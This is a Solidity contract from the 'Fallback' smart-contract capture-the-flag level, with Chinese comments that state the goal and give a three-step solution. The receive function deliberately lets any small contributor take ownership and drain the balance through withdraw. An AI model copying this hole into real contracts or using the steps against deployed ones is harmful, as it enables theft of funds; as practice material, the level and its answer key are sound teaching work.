// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

/// 通关要求
/// 1. you claim ownership of the contract
/// 2. you reduce its balance to 0

/// 解题 
/// 当我们调用一个合约时不提供调用的函数，又或者调用的函数名称不正确，就会直接运行fallback function，也就是代码中的receive函数
/// 1. 修改contributions值 ```contract.contribute({value: toWei("0.00001")})```
/// 2. 触发回调函数 ```contract.sendTransaction({value: toWei("0.00001")})```
/// 3. 调用withdraw函数成功提币
contract Fallback {
    mapping(address => uint256) public contributions;
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = payable(msg.sender);
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = payable(msg.sender);
    }
}
